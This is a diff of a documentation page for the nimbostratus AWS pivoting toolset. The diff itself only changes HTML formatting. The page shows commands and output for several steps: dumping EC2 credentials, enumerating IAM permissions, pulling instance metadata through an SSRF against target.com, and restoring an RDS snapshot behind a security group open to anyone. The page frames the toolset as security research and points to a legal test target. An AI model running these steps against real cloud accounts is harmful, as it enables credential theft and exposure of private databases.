@@ -39,7 +39,7 @@ which I developed for my <a href="pivoting-in-amazon-clouds.pdf">"Pivoting in Am
 nimbostratus-target</a>, which helps you setup a legal environment where this tool can be
 tested.</p>
 
-If you need help understanding what this toolset is all about, both my article on <a href="pivoting-in-amazon-clouds.pdf">"Pivoting in Amazon clouds"</a> and this speaker deck will be really useful.
+<p>If you need help understanding what this toolset is all about, both my article on <a href="pivoting-in-amazon-clouds.pdf">"Pivoting in Amazon clouds"</a> and this speaker deck will be really useful.</p>
 
 <script async class="speakerdeck-embed" data-id="4d575210f32101308c15221eb2650b9c" data-ratio="1.33333333333333" src="//speakerdeck.com/assets/embed.js"></script>
 
@@ -76,9 +76,9 @@ This is usually the first command to run after gaining access to an EC2 instance
 
 <div class="highlight"><pre><span class="gp">$</span> nimbostratus dump-credentials
 <span class="go">
-Found credentials<br/>
-  Access key: ...<br/>
-  Secret key: ...<br/>
+Found credentials
+  Access key: ...
+  Secret key: ...
 </span>
 </pre></div>
 
@@ -97,18 +97,18 @@ right after <code>dump-credentials</code> to know which permissions are availabl
 
 <div class="highlight"><pre><span class="gp">$</span> nimbostratus dump-permissions --access-key<span class="o">=</span>... --secret-key<span class="o">=</span>...
 <span class="go">
-Starting dump-permissions<br/>
-These credentials belong to low_privileged_user, not to the root account<br/>
-Getting access keys for user low_privileged_user<br/>
-User for key AKIAIV...J6KVA is low_privileged_user<br/>
-{u'Statement': [{u'Action': u'iam:*',<br/>
-                 u'Effect': u'Allow',<br/>
-                 u'Resource': u'*',<br/>
-                 u'Sid': u'Stmt1377108934836'},<br/>
-                {u'Action': u'sqs:*',<br/>
-                 u'Effect': u'Allow',<br/>
-                 u'Resource': u'*',<br/>
-                 u'Sid': u'Stmt1377109045369'}]}<br/>
+Starting dump-permissions
+These credentials belong to low_privileged_user, not to the root account
+Getting access keys for user low_privileged_user
+User for key AKIAIV...J6KVA is low_privileged_user
+{u'Statement': [{u'Action': u'iam:*',
+                 u'Effect': u'Allow',
+                 u'Resource': u'*',
+                 u'Sid': u'Stmt1377108934836'},
+                {u'Action': u'sqs:*',
+                 u'Effect': u'Allow',
+                 u'Resource': u'*',
+                 u'Sid': u'Stmt1377109045369'}]}
 </span>
 </pre></div>
 
@@ -126,15 +126,15 @@ provider and running this command on different instances will yield different re
 
 <div class="highlight"><pre><span class="gp">$</span> nimbostratus dump-ec2-metadata
 <span class="go">
-Starting dump-ec2-metadata<br/>
-...<br/>
-Instance type: t1.micro<br/>
-AMI ID: ami-a02f66f2<br/>
-Security groups: django_frontend_nimbostratus_sg<br/>
-Availability zone: ap-southeast-1a<br/>
-Architecture: x86_64<br/>
-Private IP: 10.130.81.89<br/>
-User data script was written to user-data.txt<br/>
+Starting dump-ec2-metadata
+...
+Instance type: t1.micro
+AMI ID: ami-a02f66f2
+Security groups: django_frontend_nimbostratus_sg
+Availability zone: ap-southeast-1a
+Architecture: x86_64
+Private IP: 10.130.81.89
+User data script was written to user-data.txt
 </span>
 </pre></div>
 
@@ -142,18 +142,18 @@ User data script was written to user-data.txt<br/>
 
 <div class="highlight"><pre><span class="gp">$</span> nimbostratus dump-ec2-metadata --mangle-function=core.utils.mangle.mangle
 <span class="go">
-Starting dump-ec2-metadata<br/>
-Requesting http://target.com/?url=http://169.254.169.254/latest/meta-data/<br/>
-Requesting http://target.com/?url=http://169.254.169.254/latest/meta-data/instance-type<br/>
-Requesting http://target.com/?url=http://169.254.169.254/latest/meta-data/instance-id<br/>
-...<br/>
-Instance type: t1.micro<br/>
-AMI ID: ami-a02f66f2<br/>
-Security groups: django_frontend_nimbostratus_sg<br/>
-Availability zone: ap-southeast-1a<br/>
-Architecture: x86_64<br/>
-Private IP: 10.130.81.89<br/>
-User data script was written to user-data.txt<br/>
+Starting dump-ec2-metadata
+Requesting http://target.com/?url=http://169.254.169.254/latest/meta-data/
+Requesting http://target.com/?url=http://169.254.169.254/latest/meta-data/instance-type
+Requesting http://target.com/?url=http://169.254.169.254/latest/meta-data/instance-id
+...
+Instance type: t1.micro
+AMI ID: ami-a02f66f2
+Security groups: django_frontend_nimbostratus_sg
+Availability zone: ap-southeast-1a
+Architecture: x86_64
+Private IP: 10.130.81.89
+User data script was written to user-data.txt
 </span>
 </pre></div>
 
@@ -165,22 +165,22 @@ don't have any access to the database itself (MySQL user). This tool allows you 
 that database by creating a snapshot and restoring it.</p>
 
 
-<div class="highlight"><pre><span class="gp">$</span> nimbostratus snapshot-rds --access-key<span class="o">=</span>... <span class="se">\</span><br/>
-                                                      --secret-key<span class="o">=</span>... <span class="se">\</span><br/>
+<div class="highlight"><pre><span class="gp">$</span> nimbostratus snapshot-rds --access-key<span class="o">=</span>... <span class="se">\</span>
+                                                      --secret-key<span class="o">=</span>... <span class="se">\</span>
                                                       --password foolmeonce --rds-name nimbostratus --region ap-southeast-1
 <span class="go">
-Starting snapshot-rds<br/>
-Waiting for snapshot to complete in AWS... (this takes at least 5m)<br/>
-Waiting...<br/>
-Waiting for restore process in AWS... (this takes at least 5m)<br/>
-Waiting...<br/>
+Starting snapshot-rds
+Waiting for snapshot to complete in AWS... (this takes at least 5m)
+Waiting...
+Waiting for restore process in AWS... (this takes at least 5m)
+Waiting...
 Creating a DB security group which allows connections from any location and applying it to the 
-newly created RDS instance. Anyone can connect to this MySQL instance at:<br/>
-    - Host: restored-sjnrpnubt.cuwm5qpy.ap-southeast-1.rds.amazonaws.com<br/>
-    - Port: 3306<br/>
-    <br/>
-    Using root:<br/>
-        mysql -u root -pfoolmeonce -h restored-sjnrpnubt.cuwm5qpy.ap-southeast-1.rds.amazonaws.com<br/>
+newly created RDS instance. Anyone can connect to this MySQL instance at:
+    - Host: restored-sjnrpnubt.cuwm5qpy.ap-southeast-1.rds.amazonaws.com
+    - Port: 3306
+    
+    Using root:
+        mysql -u root -pfoolmeonce -h restored-sjnrpnubt.cuwm5qpy.ap-southeast-1.rds.amazonaws.com
 </span>
 </pre></div>
 
